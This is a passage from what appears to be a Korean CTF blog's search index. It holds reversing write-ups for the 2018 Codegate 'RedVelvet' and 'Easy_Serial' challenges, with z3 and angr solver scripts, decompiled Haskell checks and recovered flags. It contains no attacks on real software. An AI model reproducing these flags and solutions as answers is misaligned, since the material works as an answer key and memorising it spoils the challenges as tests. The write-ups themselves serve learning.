class=\"n\">a13</span><span class=\"p\">)</span> <span class=\"o\">-</span> <span class=\"n\">a12</span> <span class=\"o\">!=</span> <span class=\"o\">-</span><span class=\"mi\">1443</span> <span class=\"p\">))</span>\n\n\n<span class=\"c\">#func10 a14, a15, a16</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a14</span> <span class=\"o\">&lt;</span> <span class=\"n\">a15</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a15</span> <span class=\"o\">&lt;</span> <span class=\"n\">a16</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a15</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"n\">a14</span> <span class=\"o\">+</span> <span class=\"n\">a16</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">-</span> <span class=\"n\">a16</span> <span class=\"o\">!=</span> <span class=\"mi\">15514</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a15</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">90</span><span class=\"p\">,</span> <span class=\"n\">a15</span> <span class=\"o\">&gt;</span> <span class=\"mi\">99</span><span class=\"p\">))</span>\n\n\n<span class=\"c\">#func11 a16, a17, a18</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a17</span> <span class=\"o\">&lt;</span> <span class=\"n\">a16</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a16</span> <span class=\"o\">&lt;</span> <span class=\"n\">a18</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a17</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">100</span><span class=\"p\">,</span> <span class=\"n\">a17</span> <span class=\"o\">&gt;</span> <span class=\"mi\">104</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">((</span><span class=\"n\">a16</span> <span class=\"o\">+</span> <span class=\"p\">(</span><span class=\"n\">a17</span> <span class=\"o\">^</span> <span class=\"p\">(</span><span class=\"n\">a17</span> <span class=\"o\">-</span> <span class=\"n\">a18</span><span class=\"p\">)))</span> <span class=\"o\">-</span> <span class=\"n\">a18</span> <span class=\"o\">!=</span> <span class=\"mi\">70</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">((</span><span class=\"n\">a17</span> <span class=\"o\">+</span> <span class=\"n\">a18</span><span class=\"p\">)</span> <span class=\"o\">/</span> <span class=\"n\">a16</span> <span class=\"o\">+</span> <span class=\"n\">a16</span> <span class=\"o\">!=</span> <span class=\"mi\">68</span><span class=\"p\">))</span>\n\n\n<span class=\"c\">#func12 a18, a19, a20</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a18</span> <span class=\"o\">&lt;</span> <span class=\"n\">a19</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a19</span> <span class=\"o\">&lt;</span> <span class=\"n\">a20</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a19</span> <span class=\"o\">&gt;</span> <span class=\"mi\">59</span><span class=\"p\">,</span> <span class=\"n\">a20</span> <span class=\"o\">&gt;</span> <span class=\"mi\">44</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a18</span> <span class=\"o\">+</span> <span class=\"p\">(</span><span class=\"n\">a19</span> <span class=\"o\">^</span> <span class=\"p\">(</span><span class=\"n\">a20</span> <span class=\"o\">+</span> <span class=\"n\">a19</span><span class=\"p\">))</span> <span class=\"o\">-</span> <span class=\"n\">a20</span> <span class=\"o\">!=</span> <span class=\"mi\">111</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">((</span><span class=\"n\">a19</span> <span class=\"o\">^</span> <span class=\"p\">(</span><span class=\"n\">a19</span> <span class=\"o\">-</span> <span class=\"n\">a20</span><span class=\"p\">))</span> <span class=\"o\">+</span> <span class=\"n\">a19</span> <span class=\"o\">!=</span> <span class=\"mi\">101</span> <span class=\"p\">))</span>\n\n\n<span class=\"c\">#func13 a20, a21, a22</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a20</span> <span class=\"o\">&gt;</span> <span class=\"n\">a21</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a21</span> <span class=\"o\">&gt;</span> <span class=\"n\">a22</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a20</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">40</span><span class=\"p\">,</span> <span class=\"n\">a21</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">90</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a22</span> <span class=\"o\">&gt;</span> <span class=\"mi\">109</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">((</span><span class=\"n\">a22</span> <span class=\"o\">+</span> <span class=\"p\">(</span><span class=\"n\">a21</span> <span class=\"o\">^</span> <span class=\"p\">(</span><span class=\"n\">a22</span> <span class=\"o\">+</span> <span class=\"n\">a20</span><span class=\"p\">))</span> <span class=\"o\">-</span> <span class=\"n\">a20</span> <span class=\"o\">!=</span> <span class=\"mi\">269</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">((</span><span class=\"n\">a22</span> <span class=\"o\">^</span> <span class=\"p\">(</span><span class=\"n\">a21</span> <span class=\"o\">-</span> <span class=\"n\">a20</span><span class=\"p\">))</span> <span class=\"o\">+</span> <span class=\"n\">a21</span> <span class=\"o\">!=</span> <span class=\"mi\">185</span><span class=\"p\">))</span>\n\n\n<span class=\"c\">#func14 a22, a23, a24</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a22</span> <span class=\"o\">&lt;</span> <span class=\"n\">a23</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a23</span> <span class=\"o\">&lt;</span> <span class=\"n\">a24</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a23</span> <span class=\"o\">&gt;</span> <span class=\"mi\">99</span><span class=\"p\">,</span> <span class=\"n\">a24</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">90</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a22</span> <span class=\"o\">+</span> <span class=\"p\">(</span><span class=\"n\">a23</span> <span class=\"o\">^</span> <span class=\"p\">(</span><span class=\"n\">a23</span> <span class=\"o\">+</span> <span class=\"n\">a22</span><span class=\"p\">))</span> <span class=\"o\">-</span> <span class=\"n\">a24</span> <span class=\"o\">!=</span> <span class=\"mi\">185</span><span class=\"p\">))</span>\n\n\n<span class=\"c\">#func15 a24, a25, a26</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a25</span> <span class=\"o\">&lt;</span> <span class=\"n\">a26</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a25</span> <span class=\"o\">&lt;</span> <span class=\"n\">a24</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(</span><span class=\"n\">a26</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">95</span><span class=\"p\">,</span> <span class=\"n\">a25</span> <span class=\"o\">&gt;</span> <span class=\"mi\">109</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(((</span><span class=\"n\">a25</span> <span class=\"o\">-</span> <span class=\"n\">a24</span><span class=\"p\">)</span> <span class=\"o\">*</span> <span class=\"n\">a25</span> <span class=\"o\">^</span> <span class=\"n\">a26</span><span class=\"p\">)</span> <span class=\"o\">-</span> <span class=\"n\">a24</span> <span class=\"o\">!=</span> <span class=\"mi\">1214</span><span class=\"p\">))</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">Not</span><span class=\"p\">(((</span><span class=\"n\">a26</span> <span class=\"o\">-</span> <span class=\"n\">a25</span><span class=\"p\">)</span> <span class=\"o\">*</span> <span class=\"n\">a26</span> <span class=\"o\">^</span> <span class=\"n\">a24</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"n\">a25</span> <span class=\"o\">!=</span> <span class=\"o\">-</span><span class=\"mi\">1034</span><span class=\"p\">))</span>\n\n\n<span class=\"k\">print</span> <span class=\"s\">\"[+]\"</span><span class=\"p\">,</span><span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">check</span><span class=\"p\">()</span>\n<span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">model</span><span class=\"p\">()</span>\n\n<span class=\"n\">flag</span><span class=\"o\">=</span><span class=\"s\">\"\"</span>\n<span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">27</span><span class=\"p\">):</span>\n    <span class=\"n\">strVar</span> <span class=\"o\">=</span> <span class=\"nb\">globals</span><span class=\"p\">()[</span><span class=\"s\">'a</span><span class=\"si\">%</span><span class=\"s\">i'</span> <span class=\"o\">%</span> <span class=\"n\">i</span><span class=\"p\">]</span>\n    <span class=\"n\">char</span> <span class=\"o\">=</span> <span class=\"n\">result</span><span class=\"p\">[</span><span class=\"n\">strVar</span><span class=\"p\">]</span><span class=\"o\">.</span><span class=\"n\">as_long</span><span class=\"p\">()</span>\n    <span class=\"n\">flag</span> <span class=\"o\">+=</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"n\">char</span><span class=\"p\">)</span>\n<span class=\"k\">print</span> <span class=\"n\">flag</span>\n</code></pre></div></div>\n\n<p>위 z3 code를 돌리면, flag를 확인할 수 있는데 hash value 가 맞지 않아 정상적으로 인증할 수 없다. 자세히 살펴보면, ` 문자열이 있는걸 볼 수 있는데 이어서 나오는 문자가 ‘la’인 것을 보고 적절히 바꿔주었더니 정답임을 확인할 수 있었다. Symbolic 자체가 조건에 부합하는 다른 값이 존재할 수 있기 때문에 발생한 문제인 것 같다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Codegate_CTF/문제백업/[Rev]RedVelvet\npython ./solver.py\n<span class=\"o\">[</span>+] sat\nWhat_You_Wanna_By?:<span class=\"o\">)</span><span class=\"p\">;</span>l<span class=\"sb\">`</span>_la\n</code></pre></div></div>\n\n<p><br /></p>\n<h2 id=\"solution2---angr-script\">Solution2 - Angr Script</h2>\n\n<ul>\n  <li>reference : http://blog.redrocket.club/2018/02/04/Codegate-2018-Preliminary-RedVelvet/</li>\n</ul>\n\n<p>팀원이 맨처음 Binary를 봤을 때, Angr로 해결할 수 있을 것 같다고 했었는데 Angr로도 역시 해당 문제를 풀이할 수 있었다. Find address, Avoid address 적절히 찾아 배치하고 돌리면 정답이 튀어나오는 것을 볼 수 있었는데, Angr는 항상 내가 짜면 posix dump에서 Not found가 뜬다;;;  차이점을 보니, printable 범위를 지정해준 것. simulator 설정해준 것 등 여러 차이점이 있었다.. 단순하게 find, avoid address 만 지정해주는 방식으로는 해결이 되지 않는다;; angr 연습이 필요할 듯..</p>\n\n<div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kn\">import</span> <span class=\"nn\">angr</span>\n\n<span class=\"n\">p</span> <span class=\"o\">=</span> <span class=\"n\">angr</span><span class=\"o\">.</span><span class=\"n\">Project</span><span class=\"p\">(</span><span class=\"s\">'./RedVelvet'</span><span class=\"p\">,</span> <span class=\"n\">load_options</span><span class=\"o\">=</span><span class=\"p\">{</span><span class=\"s\">\"auto_load_libs\"</span><span class=\"p\">:</span> <span class=\"bp\">False</span><span class=\"p\">})</span>\n\n<span class=\"n\">st</span> <span class=\"o\">=</span> <span class=\"n\">p</span><span class=\"o\">.</span><span class=\"n\">factory</span><span class=\"o\">.</span><span class=\"n\">entry_state</span><span class=\"p\">()</span>\n\n<span class=\"c\"># in printable range</span>\n<span class=\"k\">for</span> <span class=\"n\">_</span> <span class=\"ow\">in</span> <span class=\"nb\">xrange</span><span class=\"p\">(</span><span class=\"mi\">26</span><span class=\"p\">):</span>\n    <span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">st</span><span class=\"o\">.</span><span class=\"n\">posix</span><span class=\"o\">.</span><span class=\"n\">files</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">.</span><span class=\"n\">read_from</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">)</span>\n    <span class=\"n\">st</span><span class=\"o\">.</span><span class=\"n\">solver</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">k</span> <span class=\"o\">&gt;=</span> <span class=\"mh\">0x20</span><span class=\"p\">)</span>\n    <span class=\"n\">st</span><span class=\"o\">.</span><span class=\"n\">solver</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">k</span> <span class=\"o\">&lt;=</span> <span class=\"mh\">0x7e</span><span class=\"p\">)</span>\n\n<span class=\"c\"># Constrain the last byte to be a newline</span>\n<span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">st</span><span class=\"o\">.</span><span class=\"n\">posix</span><span class=\"o\">.</span><span class=\"n\">files</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">.</span><span class=\"n\">read_from</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">)</span>\n<span class=\"n\">st</span><span class=\"o\">.</span><span class=\"n\">solver</span><span class=\"o\">.</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">k</span> <span class=\"o\">==</span> <span class=\"mi\">10</span><span class=\"p\">)</span>\n\n<span class=\"c\"># Reset the symbolic stdin's properties and set its length.</span>\n<span class=\"n\">st</span><span class=\"o\">.</span><span class=\"n\">posix</span><span class=\"o\">.</span><span class=\"n\">files</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">.</span><span class=\"n\">seek</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n<span class=\"n\">st</span><span class=\"o\">.</span><span class=\"n\">posix</span><span class=\"o\">.</span><span class=\"n\">files</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">.</span><span class=\"n\">length</span> <span class=\"o\">=</span> <span class=\"mi\">27</span>\n\n<span class=\"n\">sm</span> <span class=\"o\">=</span> <span class=\"n\">p</span><span class=\"o\">.</span><span class=\"n\">factory</span><span class=\"o\">.</span><span class=\"n\">simulation_manager</span><span class=\"p\">(</span><span class=\"n\">st</span><span class=\"p\">)</span>\n<span class=\"n\">sm</span><span class=\"o\">.</span><span class=\"n\">explore</span><span class=\"p\">(</span><span class=\"n\">avoid</span><span class=\"o\">=</span><span class=\"mh\">0x004007d0</span><span class=\"p\">,</span> <span class=\"n\">find</span><span class=\"o\">=</span><span class=\"mh\">0x0040152d</span><span class=\"p\">)</span>\n\n<span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">sm</span><span class=\"o\">.</span><span class=\"n\">found</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">.</span><span class=\"n\">posix</span><span class=\"o\">.</span><span class=\"n\">dumps</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">))</span>\n\n</code></pre></div></div>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> ⚡ root@RebForPwn  ~/jsh  python ./solver.py\nWARNING | 2018-02-06 19:00:44,933 | angr.engines.successors | Exit state has over 257 possible solutions. Likely unconstrained<span class=\"p\">;</span> skipping. &lt;BV64 reg_28_31_64&gt;\nWhat_You_Wanna_Be?:<span class=\"o\">)</span>_lc_la\n</code></pre></div></div>\n\n<p><br /></p>\n<h2 id=\"solution3---angryida\">Solution3 - AngryIDA</h2>\n<ul>\n  <li>install reference : https://github.com/jinsoohyun/AngryIDA</li>\n</ul>\n\n<p><code class=\"highlighter-rouge\">AngryIDA</code>라는 IDA Plugin을 이용한 풀이 방식인데, Angr가 설치된 x64 Windows 환경에서 IDA Plugin으로 Angr를 바로 이용할 수 있는 방식이다. 얼핏 보면 <code class=\"highlighter-rouge\">Ponce</code>랑 유사한 느낌.. 아래 처럼 avoid, find offset을 직접 지정해주고, explorer 에서 run만 눌러주면 stdin에 대한 값을 찾아내는 걸 확인할 수 있다. (angr 동작이랑 동일하다, 단지 IDA 에서 수행될 뿐..)</p>\n\n<p><img src=\"/images/2018-02-06-Codegate-CTF-RedVelvet-75/angryIDA.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] angryIDA</i></p>\n\n<p><br /></p>\n<h2 id=\"etc---radare2\">ETC - Radare2</h2>\n\n<ul>\n  <li>풀이 올라온 걸 보다보니, Radare2를 이용해 binary 분석을 한 외쿡인도 있었다. 예전에 좀 살펴보고 IDA 에 비해 영 불편해서 안쓰고 살았는데 풀어보는 과정을 보니 역시, 장인은 도구를 탓하지 않는다는 말이 맞는것 같다 ㅋㅋ..</li>\n</ul>\n\n<p align=\"right\"><strong>FLAG{What_You_Wanna_By?:);la_la}</strong></p>\n"
    } ,
  
    {
      "title"    : "[2018_Codegate_CTF] Easy_Serial (350)",
      "category" : "CTF2018_Codegate",
      "tags"     : "Reversing, haskell",
      "url"      : "/ctf/2018_codegate/2018/02/06/Codegate-CTF-Easy-Serial-350/",
      "date"     : "2018-02-06 00:00:00 +0900",
      "content"   : "<h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>Download</p>\n</blockquote>\n\n<p>너무 매정한 지문..</p>\n\n<p><img src=\"/images/2018-02-06-Codegate-CTF-Easy-Serial-350/exercise.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] exercise</i></p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>다운받은 binary를 확인해보면, ELFx64임을 알 수 있다.</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> ⚡ root@RebForPwn  ~/jsh  file ./easy\n./easy: ELF 64-bit LSB executable, x86-64, version 1 <span class=\"o\">(</span>SYSV<span class=\"o\">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class=\"k\">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class=\"o\">=</span>4bd1814b358aaa9e61a968f20bd14ffa9cd208e8, not stripped\n</code></pre></div></div>\n\n<p><br />\n실행해보면, serial Key를 입력 받는 것을 확인해 볼 수 있다.\n<img src=\"/images/2018-02-06-Codegate-CTF-Easy-Serial-350/run.png\" alt=\"\" /></p>\n<p align=\"center\"><i>[그림] run</i></p>\n\n<p>IDA로 열어보면 hs_main부분을 확인할 수 있는데, <code class=\"highlighter-rouge\">Haskell</code>로 작성된 binary 이다.</p>\n<pre><code class=\"language-C\">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)\n{\n  __int64 v3; // r8\n  __int64 v4; // r9\n  __int64 v5; // ST30_8\n\n  HIDWORD(v5) = HIDWORD(defaultRtsConfig);\n  LODWORD(v5) = 1;\n  hs_main(argc, (__int64)argv, (__int64)&amp;ZCMain_main_closure, (__int64)argv, v3, v4, v5, 0LL, 1LL);\n}\n</code></pre>\n<p><br /></p>\n\n<p>예전에 Samsung CTF 본선에서 하스켈로 짜여진 문제가 나왔던 기억이 있는데, 그때 당시에도 decompiler를 찾아보려 했었지만, 딱히 정상적으로 변환이 되는 항목은 볼 수 없었다. (테이블 만들고, 브포하고 노가다 했던 기억이…) 근데, git hub 에서 다시 찾아본 결과 “https://github.com/gereeter/hsdecomp” 에서의 decompiler를 이용해 Binary –&gt; Code 형태로 변환할 수 있다. 그대로 디컴파일 시도할 경우, 에러가 나는데 팀원이 에러나는 부분을 수정해서 제공해줬다~</p>\n\n<p>변환한 Haskell Code는 아래와 같다.</p>\n<pre><code class=\"language-Haskell\">('Main_main_closure', '=', '&gt;&gt; $fMonadIO\n    (putStrLn (unpackCString# \"Input Serial Key &gt;&gt;&gt; \"))\n    (&gt;&gt;= $fMonadIO\n        getLine\n        (\\\\s1dZ_info_arg_0 -&gt;\n            &gt;&gt; $fMonadIO\n                (putStrLn\n                    (++ (unpackCString# \"your serial key &gt;&gt;&gt; \")\n                    (++ s1b7_info (++ (unpackCString# \"_\")\n                    (++ s1b9_info (++ (unpackCString# \"_\") s1bb_info))))))\n\n                (case &amp;&amp;\n                    (== $fEqInt (ord (!! s1b7_info loc_7172456)) (I# 70))\n                    (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172472)) (I# 108))\n                        (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172488)) (I# 97))\n                            (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172504)) (I# 103))\n                                (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172520)) (I# 123))\n                                    (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172536)) (I# 83))\n                                        (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172552)) (I# 48))\n                                            (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172568)) (I# 109))\n                                                (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172584)) (I# 101))\n                                                    (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172600)) (I# 48))\n                                                        (&amp;&amp; (== $fEqInt (ord (!! s1b7_info (I# 10))) (I# 102))\n                                                            (&amp;&amp; (== $fEqInt (ord (!! s1b7_info (I# 11))) (I# 85))\n                                                                (== $fEqInt (ord (!! s1b7_info (I# 12))) (I# 53)))))))))))))\n                    of\n                    &lt;tag 1&gt; -&gt; putStrLn (unpackCString# \":p\"),\n                    c1ni_info_case_tag_DEFAULT_arg_0@_DEFAULT -&gt; case == ($fEq[] $fEqChar)\n                    (reverse s1b9_info)\n                    (: (C# 103)\n                        (: (C# 110)\n                            (: (C# 105)\n                                (: (C# 107)\n                                    (: loc_7168872\n                                        (: loc_7168872\n                                            (: (C# 76)\n                                                (: (C# 51)\n                                                    (: (C# 114)\n                                                        (: (C# 52) [])))))))))) of\n                        False -&gt; putStrLn (unpackCString# \":p\"),\n                        True -&gt; case &amp;&amp;\n\n                        (== $fEqChar (!! s1bb_info 0) (!! s1b3_info loc_7172456)) (&amp;&amp;\n                            (== $fEqChar (!! s1bb_info 1) (!! s1b4_info (I# 19))) (&amp;&amp;\n                                (== $fEqChar (!! s1bb_info 2) (!! s1b3_info (I# 19))) (&amp;&amp;\n                                    (== $fEqChar (!! s1bb_info 3) (!! s1b4_info 7)) (&amp;&amp;\n                                        (== $fEqChar (!! s1bb_info 4) (!! s1b2_info 2)) (&amp;&amp;\n                                            (== $fEqChar (!! s1bb_info 5) (!! s1b3_info (I# 18))) (&amp;&amp;\n                                                (== $fEqChar (!! s1bb_info 6) (!! s1b4_info (I# 19))) (&amp;&amp;\n                                                    (== $fEqChar (!! s1bb_info 7) (!! s1b2_info 3)) (&amp;&amp;\n                                                        (== $fEqChar (!! s1bb_info 8) (!! s1b4_info (I# 17)))\n                                                            (== $fEqChar (!! s1bb_info 9) (!! s1b4_info (I# 18))))))))))) of\n                    &lt;tag 1&gt; -&gt; putStrLn (unpackCString# \":p\"),\n                    c1tb_info_case_tag_DEFAULT_arg_0@_DEFAULT -&gt; putStrLn (unpackCString# \"Correct Serial Key! Auth Flag!\")\n                )\n        )\n    )')\n('s1b4_info', '=', 'unpackCString# \"abcdefghijklmnopqrstuvwxyz\"')\n('loc_7172600', '=', 'I# 9')\n('s1bb_info', '=', '!! s1b5_info loc_7172488')\n('loc_7172488', '=', 'I# 2')\n('s1b5_info', '=', 'splitOn $fEqChar (unpackCString# \"#\") s1dZ_info_arg_0')\n('loc_7172584', '=', 'I# 8')\n('loc_7172504', '=', 'I# 3')\n('s1b2_info', '=', 'unpackCString# \"1234567890\"')\n('loc_7172568', '=', 'I# 7')\n('loc_7172552', '=', 'I# 6')\n('s1b3_info', '=', 'unpackCString# \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"')\n('loc_7172536', '=', 'I# 5')\n('loc_7172520', '=', 'I# 4')\n('loc_7172472', '=', 'I# 1')\n('loc_7172456', '=', 'I# 0')\n('loc_7168872', '=', 'C# 48')\n('s1b9_info', '=', '!! s1b5_info loc_7172472')\n('s1b7_info', '=', '!! s1b5_info loc_7172456')\n</code></pre>\n\n<p>문법을 조금 찾아보면, 입력 값에 대해서 <code class=\"highlighter-rouge\">#</code>으로 구분하여 3부분으로 나눈다. ASCII 값 비교 구문을 통해, serial check를 수행하는데, 첫번째 구간에 해당하는 string은 아래와 같다.</p>\n<pre><code class=\"language-Haskell\">(== $fEqInt (ord (!! s1b7_info loc_7172456)) (I# 70))\n                    (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172472)) (I# 108))\n                        (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172488)) (I# 97))\n                            (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172504)) (I# 103))\n                                (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172520)) (I# 123))\n                                    (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172536)) (I# 83))\n                                        (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172552)) (I# 48))\n                                            (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172568)) (I# 109))\n                                                (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172584)) (I# 101))\n                                                    (&amp;&amp; (== $fEqInt (ord (!! s1b7_info loc_7172600)) (I# 48))\n                                                        (&amp;&amp; (== $fEqInt (ord (!! s1b7_info (I# 10))) (I# 102))\n                                                            (&amp;&amp; (== $fEqInt (ord (!! s1b7_info (I# 11))) (I# 85))\n                                                                (== $fEqInt (ord (!! s1b7_info (I# 12))) (I# 53)))))))))))))\n</code></pre>\n\n<div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">70</span><span class=\"p\">,</span><span class=\"mi\">108</span><span class=\"p\">,</span><span class=\"mi\">97</span><span class=\"p\">,</span><span class=\"mi\">103</span><span class=\"p\">,</span><span class=\"mi\">123</span><span class=\"p\">,</span><span class=\"mi\">83</span><span class=\"p\">,</span><span class=\"mi\">48</span><span class=\"p\">,</span><span class=\"mi\">109</span><span class=\"p\">,</span><span class=\"mi\">101</span><span 